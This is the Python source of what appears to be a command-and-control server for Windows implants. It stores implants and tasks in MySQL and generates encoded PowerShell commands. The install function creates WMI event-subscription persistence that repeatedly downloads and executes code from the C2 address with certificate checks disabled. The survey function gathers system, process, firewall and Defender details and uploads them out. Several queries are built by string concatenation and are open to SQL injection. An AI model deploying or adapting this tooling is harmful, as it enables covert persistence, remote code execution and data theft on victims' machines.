#!/usr/bin/python3

from flask import Flask,render_template,request,redirect,url_for,flash,make_response
import time
from base64 import b64encode
import MySQLdb


def getCheckIns(connection,UUID,depth):
    cur = connection.cursor()
    connection.commit()
    implants = cur.execute("select * from checkins where UUID='" + UUID + "' order by last_checkin desc limit "+ depth)
    implantDetails = cur.fetchall()
    cur.close()
    return implantDetails

def getTasks(connection,UUID,complete):
    cur = connection.cursor()
    connection.commit()
    tasks = cur.execute("SELECT id,UUID,task,notes,time_complete FROM tasks where (is_complete=" + complete + ") order by id desc")
    taskDetails = cur.fetchall()
    cur.close()
    return taskDetails

def getDetails(connection,UUID):
    cur = connection.cursor()
    connection.commit()
    implant = cur.execute("select * from implants where UUID='"+UUID+"'")
    implantDetails = cur.fetchall()
    cur.close()
    return implantDetails

def getC2List(connection):
    cur = connection.cursor()
    c2listget = cur.execute("select * from callbackAddresses")
    c2list = cur.fetchall()    
    cur.close()
    return(c2list)


def getSurveyList(connection,UUID):
    connection.commit()
    cur = connection.cursor()
    surveyData = cur.execute("select id,UUID,delivered,details,data from datastore where (uuid = '" + UUID + "') order by delivered desc limit 30")
    surveyData = cur.fetchall()
    cur.close()
    return(surveyData)

def addImplant(connection,UUID,implantkey,notes,c2,filter,consumer,ssl):
    cur=connection.cursor()
    cur.execute("INSERT INTO implants (UUID,implantkey,notes,c2,filter,consumer) VALUES (%s,%s,%s,%s,%s,%s)",(UUID,implantkey,notes,c2,filter,consumer))
    cur.execute("update checkins set last_checkin='1990-01-01 00:00:00' where (UUID='" + UUID + "')")
    connection.commit()
    cur.close()
    return

def addTask(connection,UUID,task,notes):
    connection.commit()
    cur = connection.cursor()
    cur.execute("INSERT INTO tasks (UUID,task,notes) VALUES (%s,%s,%s)",(UUID,task,notes))
    connection.commit()
    cur.close()
    return


def deleteTask(connection,taskID):
    cur=connection.cursor()
    connection.commit()
    cur.execute("SELECT is_complete FROM tasks WHERE id = %s", (taskID,))
    isComplete = cur.fetchall()
    isComplete=isComplete[0][0]
    print(isComplete)
    if isComplete == 0:
        cur.execute("delete from tasks where (id="+taskID+") and (is_complete=0)")
        connection.commit()
        cur.close()
    else:
        cur.close()
        raise ValueError('The task has already completed')
    return

def updateNotes(connection,UUID,notes):
    cur=connection.cursor()
    cur.execute("update implants set notes='%s' where (UUID='%s')" % (notes,UUID))
    connection.commit()
    cur.close()
    return

def updateSettings(connection,UUID,notes,C2,filter,consumer,interval):
    cur=connection.cursor()
    uninstall = generateInstall(connection,UUID,interval)[1]      #Get the current uninstall information
    cur.execute("UPDATE implants SET notes = %s, c2 = %s, filter = %s, consumer = %s WHERE UUID = %s", (notes, C2, filter, consumer, UUID))
    connection.commit()
    cur.close()
    install = generateInstall(connection,UUID,interval)[0]       #Get the new install information
    uninstallReinstall =  uninstall + ";" + install
    addTask(connection,UUID,uninstallReinstall,"SYSTEM TASK: Update Implant Settings")
    return    



def generateSurvey(connection,UUID,options,notes):
#Options Key
#[0]Directories
#[1]firewall/netsh
#[2]mp-preference

    task = "$message=(hostname)\n"
    task = task+"$message+= (systeminfo) | Out-String\n"
    task = task+"$message+= (get-process | select-object id, name, path) | Out-String\n"
    task = task+"$message+= (get-service) | Out-String\n"
    if options[0]:
        task = task+"$message+= (get-childitem c:\) | Out-String\n"
        task = task+"$message+= (get-childitem c:\windows) | Out-String\n"
        task = task+"$message+= (get-childitem c:\windows\system32) | Out-String\n"
        task = task+"$message+= (get-childitem \"c:\program files\") | Out-String\n"
        task = task+"$message+= (get-childitem \"c:\program files (x86)\")| Out-String -errorAction SilentlyContinue\n"
    if options[1]:
        task = task+"$message+= \"PortProxy Settings:\"\n"
        task = task+"$message+= (netsh interface portproxy show all) | Out-String\n"
        task = task+"$message+= \"Firewall Profiles:\"\n"
        task = task+"$message+= (get-netconnectionprofile) | Out-String\n"
        task = task+"$message+= (get-netfirewallprofile) | Out-String\n"
    if options[2]:
        task = task+"$message+= (get-mppreference) | Out-String\n"
    
    
    cur=connection.cursor()      #Get C2 address from database
    cur.execute("select c2,implantkey from implants where (UUID = '" + UUID + "')")
    data=cur.fetchall()
    address=data[0][0]
    key=data[0][1]
    task=task+ "$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n" 
    if address[4] == "s":     #ssl bumper if needed
        task = task+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"        
    task=task+"(New-Object Net.Webclient).UploadString('%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '%s'  }\")" % (address,UUID,key,notes)
    
    task = b64encode(task.encode('UTF-16LE')).decode('UTF-8')
    task = encodedtask = "powershell -e " + task

    return(task)



def generateInstall(connection,UUID,interval):
    interval=int(interval)
    cur=connection.cursor()
    connection.commit()
    cur.execute("select * from implants where (UUID='" + UUID + "')")
    implant = cur.fetchall()
    implant=implant[0]
    cur.close()
    print(implant)
    UUID = implant[0]
    key = implant[1]
    address = implant[3]
    filter = implant[4]
    consumer = implant[5]
    ssl = False

    if address[4] == "s": #Check http"s" for ssl
        ssl = True
    #set WMIQuery based on interval
    #
    #
    #

    if interval==1:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0\""
    if interval==2:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=15 OR TargetInstance.Minute=30 OR TargetInstance.Minute=45) AND TargetInstance.Second=0\""
    if interval==3:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=30) AND TargetInstance.Second=0\""
    if interval==4:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1) AND TargetInstance.Second=0\""
    if interval==5:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Hour=0 OR TargetInstance.Hour=4 OR TargetInstance.Hour=8 OR TargetInstance.Hour=12 OR TargetInstance.Hour=16 OR TargetInstance.Hour=20) AND TargetInstance.Minute=1 AND TargetInstance.Second=0\""
    if interval==0:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\""


    #BuildConsumer Block
    messageblock="iex(New-Object Net.Webclient).UploadString('%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'req' }\")" % (address,UUID,key)
   
    if ssl: #Add SSL powershell cert check overide if SSL
        messageblock = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + messageblock
    
    messageblock = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8') #base64 encode this
    messageblock="\"powershell -e %s \"" % (messageblock)                     #add the 'powershell -e'
     
    #Create WMI Event Subscription Data
    data='''
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance();
$instanceFilter.QueryLanguage = "WQL";
%s;
$instanceFilter.Name = "%s";
$instanceFilter.EventNamespace = 'root\cimv2';
$result = $instanceFilter.Put();
$newFilter = $result.Path;
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance();
$instanceConsumer.Name = '%s' ;
$instanceConsumer.CommandLineTemplate  = %s;
$result = $instanceConsumer.Put();
$newConsumer = $result.Path;
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance();
$instanceBinding.Filter = $newFilter;
$instanceBinding.Consumer = $newConsumer;
$result = $instanceBinding.Put();
$newBinding = $result.Path

''' % (interval_setting,filter,consumer,messageblock)
  
    #Create uninstall commands

    remove_data= '''
$x="\\\.\\root\subscription:__EventFilter.Name='%s'"
([wmi]$x).Delete()
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='%s'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"%s\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"%s\\""'
([wmi]$x).Delete()

''' % (filter,consumer,consumer,filter)
  
    #base64 encode everything
    data = b64encode(data.encode('UTF-16LE')).decode('UTF-8')
    remove_data = b64encode(remove_data.encode('UTF-16LE')).decode('UTF-8')
    data = "powershell -e " + data
    remove_data = "powershell -e " + remove_data
    installLines=[data,remove_data]    
    return(installLines)
